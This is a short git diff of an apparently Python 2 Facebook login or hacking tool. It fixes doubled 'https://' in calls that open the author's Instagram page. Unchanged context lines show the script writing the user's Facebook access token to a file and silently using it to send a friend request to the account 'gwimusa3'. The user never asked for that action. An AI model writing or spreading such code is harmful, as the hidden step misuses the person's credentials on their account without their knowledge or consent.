@@ -139,10 +139,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Don't have id and password"
-            os.system('xdg-open https://https://www.instagram.com/zero_xvip')
+            os.system('xdg-open https://www.instagram.com/zero_xvip')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://https://www.instagram.com/zero_xvip')
+        os.system('xdg-open https://www.instagram.com/zero_xvip')
 
 def login():
 	os.system('clear')
@@ -183,7 +183,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] successful login...'
-				os.system('xdg-open https://https://www.instagram.com/zero_xvip')
+				os.system('xdg-open https://www.instagram.com/zero_xvip')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
